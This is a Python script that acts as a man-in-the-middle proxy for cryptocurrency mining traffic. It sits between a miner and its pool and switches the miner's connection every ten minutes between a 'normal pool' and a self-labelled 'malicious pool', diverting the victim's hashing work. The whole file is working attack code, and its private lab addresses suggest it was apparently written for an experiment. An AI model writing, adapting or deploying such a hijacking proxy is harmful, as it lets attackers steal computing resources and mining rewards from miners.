import socket
import json
import time
from threading import Thread

BUFSIZE = 10000

FLAG1, FLAG2, FLAG3, FLAG4, FLAG11, FLAG22, FLAG33, FLAG44 = 1, 1, 1, 1, 1, 1, 1, 1


def work_for_normal():
    
    global FLAG1, FLAG3, FLAG11, FLAG33
    FLAG1, FLAG3, FLAG11, FLAG33 = 1, 1, 1, 1

    print("============================================================================")
    print("|                       \033[1;34;48m  STRAT TO WORK FOR NORMAL POOL\033[0m           |")
    print("============================================================================")

    server_listen_3333 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_listen_3333.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_listen_3333.bind(("172.16.20.16", 3333))
    server_listen_3333.listen(0)
    a, b = server_listen_3333.accept()

    time_start = time.time()

    s_normal = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_normal.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s_normal.connect(("172.16.44.20", 3333))

    thread_01 = Thread(target=transfer_for_miner_to_normal, args=(a, s_normal))
    thread_01.start()
    thread_02 = Thread(target=transfer_for_normal, args=(a, s_normal))
    thread_02.start()

    while True:
        time_end = time.time()
        time_acc = time_end - time_start
        if (time_acc) > 600:
            break

    FLAG1, FLAG3 = 0, 0

    print("+--------------------------------------------------------------------------+")
    print("|                           \033[1;39;48mTEN MINUTES PASSED\033[0m                             |")
    print("+--------------------------------------------------------------------------+")

    while True:
        if FLAG11 == 0 and FLAG33 == 0:
            break

    server_listen_3333.shutdown(2)
    server_listen_3333.close()

    s_normal.shutdown(2)
    s_normal.close()
    work_for_self()


def work_for_self():
    global FLAG2, FLAG4, FLAG22, FLAG44
    FLAG2, FLAG4, FLAG22, FLAG44 = 1, 1, 1, 1
    # 开始计时
    print("============================================================================")
    print("|                 \033[1;35;48m  STRAT TO WORK FOR MALICIOUS POOL\033[0m      |")
    print("============================================================================")
    server_listen_3333 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_listen_3333.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_listen_3333.bind(("172.16.20.16", 3333))
    server_listen_3333.listen(0)
    a, b = server_listen_3333.accept()
    time_start = time.time()
    s_self = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_self.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s_self.connect(("172.16.44.21", 3333))
    thread_03 = Thread(target=transfer_for_miner_to_self, args=(a, s_self))
    thread_03.start()
    thread_04 = Thread(target=transfer_for_self, args=(a, s_self))
    thread_04.start()
    while True:
        time_end = time.time()
        time_acc = time_end - time_start
        # 为自建矿池工作10分钟就退出
        if (time_acc) > 600:
            break
    FLAG2 = 0
    FLAG4 = 0
    print("+--------------------------------------------------------------------------+")
    print("|                           \033[1;39;48mTEN MINUTES PASSED\033[0m                             |")
    print("+--------------------------------------------------------------------------+")
    while True:
        if FLAG22 == 0 and FLAG44 == 0:
            break
    server_listen_3333.shutdown(2)
    server_listen_3333.close()
    s_self.shutdown(2)
    s_self.close()
    work_for_normal()


def transfer_for_miner_to_normal(a, s_normal):
    global FLAG1, FLAG11
    while True:
        if FLAG1 == 0:
            FLAG11 = 0
            break
        message_from_miner = a.recv(BUFSIZE)
        s_normal.sendall(message_from_miner)


def transfer_for_miner_to_self(a, s_self):
    global FLAG2, FLAG22
    while True:
        if FLAG2 == 0:
            FLAG22 = 0
            break
        message_from_miner = a.recv(BUFSIZE)
        s_self.sendall(message_from_miner)


def transfer_for_normal(a, s_normal):
    global FLAG3, FLAG33
    while True:
        if FLAG3 == 0:
            FLAG33 = 0
            break
        message_normal = s_normal.recv(BUFSIZE)
        a.sendall(message_normal)


def transfer_for_self(a, s_self):
    global FLAG4, FLAG44
    while True:
        if FLAG4 == 0:
            FLAG44 = 0
            break
        message_self = s_self.recv(BUFSIZE)
        a.sendall(message_self)


if __name__ == "__main__":
    work_for_normal()
